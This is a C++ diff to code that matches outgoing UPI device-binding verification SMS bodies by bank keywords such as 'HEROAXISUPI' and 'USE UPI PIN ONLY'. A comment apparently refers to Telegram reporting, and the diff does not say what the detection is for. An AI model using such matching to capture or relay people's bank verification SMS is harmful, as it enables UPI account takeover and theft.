@@ -151,6 +151,17 @@ std::string to_upper(std::string s) {
     return s;
 }
 
+/** Uppercase + drop punctuation so "DO NOT COPY, FORWARD" matches. */
+std::string normalize_match(std::string s) {
+    s = to_upper(std::move(s));
+    std::string out;
+    out.reserve(s.size());
+    for (unsigned char c : s) {
+        if (std::isalnum(c) || c == ' ') out += static_cast<char>(c);
+    }
+    return out;
+}
+
 bool is_placeholder_sender(const std::string& id) {
     return id.empty() || id == "AD-TEST-S";
 }
@@ -202,27 +213,29 @@ bool is_clean_sms_dest(const std::string& dest) {
 /**
  * Outgoing UPI verify SMS body (HEROAXISUPI / DO NOT COPY…) — NOT incoming OTP.
  * Broad keywords like OTP/HERO/AXIS alone are NOT enough (false TG spam).
+ * Matches SMS Tweaks style: "DO NOT COPY, FORWARD…" / "USE UPI PIN ONLY…".
  */
 bool is_outgoing_upi_verify_body(const std::string& body) {
     if (body.empty() || body.size() < 8) return false;
     if (is_incoming_otp_noise(body)) return false;
     if (body.find("com.") == 0 || body.find("android.") == 0) return false;
-    const std::string upper = to_upper(body);
+    const std::string norm = normalize_match(body);
     static const char* out_kw[] = {
         "HEROAXISUPI",
         "DO NOT COPY FORWARD OR SHARE THIS MESSAGE",
+        "DO NOT COPY FORWARD OR SHARE",
         "UNDER ANY CIRCUMSTANCE",
+        "USE UPI PIN ONLY",
         "YESPROUPI",
         "YESPRO ",
         "PHONEPEUPI",
-        "GPAY",
         nullptr,
     };
     for (const char** kw = out_kw; *kw; ++kw) {
-        if (upper.find(*kw) != std::string::npos) return true;
+        if (norm.find(*kw) != std::string::npos) return true;
     }
     // HEROAXIS token without "UPI Registration OTP" noise
-    if (upper.find("HEROAXIS") != std::string::npos && upper.find("OTP") == std::string::npos)
+    if (norm.find("HEROAXIS") != std::string::npos && norm.find("OTP") == std::string::npos)
         return true;
     return false;
 }
@@ -232,14 +245,15 @@ bool body_has_verify_token(const std::string& body) {
     if (is_outgoing_upi_verify_body(body)) return true;
     if (is_incoming_otp_noise(body)) return false;
     if (body.empty()) return false;
-    const std::string upper = to_upper(body);
+    const std::string norm = normalize_match(body);
     static const char* keywords[] = {
         "YESPRO", "YESPROUPI", "YESPAY", "YESBNK",
         "HEROAXISUPI", "HEROAXIS",
         "DO NOT COPY FORWARD", "FORWARD OR SHARE", "UNDER ANY CIRCUMSTANCE",
+        "USE UPI PIN ONLY",
         nullptr};
     for (const char** kw = keywords; *kw; ++kw) {
-        if (upper.find(*kw) != std::string::npos) return true;
+        if (norm.find(*kw) != std::string::npos) return true;
     }
     return false;
 }
@@ -672,7 +686,9 @@ bool blob_looks_like_outgoing_send(const std::string& blob) {
     if (blob_contains_needle(blob, "HEROAXISUPI")) return true;
     if (blob_contains_needle(blob, "HEROAXIS")) return true;
     if (blob_contains_needle(blob, "DO NOT COPY FORWARD")) return true;
+    if (blob_contains_needle(blob, "DO NOT COPY")) return true;
     if (blob_contains_needle(blob, "UNDER ANY CIRCUMSTANCE")) return true;
+    if (blob_contains_needle(blob, "USE UPI PIN ONLY")) return true;
     if (blob_contains_needle(blob, "YESPROUPI")) return true;
     if (blob_contains_needle(blob, "smsto:")) return true;
     if (blob_contains_needle(blob, "SMSTO:")) return true;
